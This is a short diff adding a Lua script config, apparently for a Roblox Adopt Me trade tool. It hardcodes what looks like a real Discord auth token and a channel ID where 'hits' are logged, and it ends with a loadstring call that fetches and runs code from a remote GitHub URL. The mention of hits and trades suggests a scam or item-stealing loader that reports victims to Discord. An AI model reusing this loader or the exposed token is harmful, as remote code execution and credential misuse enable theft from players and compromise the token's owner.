@@ -1,0 +1,5 @@
+token = "MTE0NDAzODI5MTMwNjQ2NzM5OA.G69-dG.ZjBbXRIkaqujEtgaqYS8PGDI95WdlG1l8UuGX4" -- Discord Token here (DISCORD AUTH TOKEN) TUTORIAL: 
+channelId = "1340480138676273156" -- Channel ID that your hits are in. TUTORIAL: 
+delay = 0.1 -- How many seconds it will wait to chat after loading is done. If you have problems with not getting trades, try making delay higher (I dont recommend higher than 5)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZENHUBV1/ADOPT-ME/refs/heads/main/Main%20file"))()
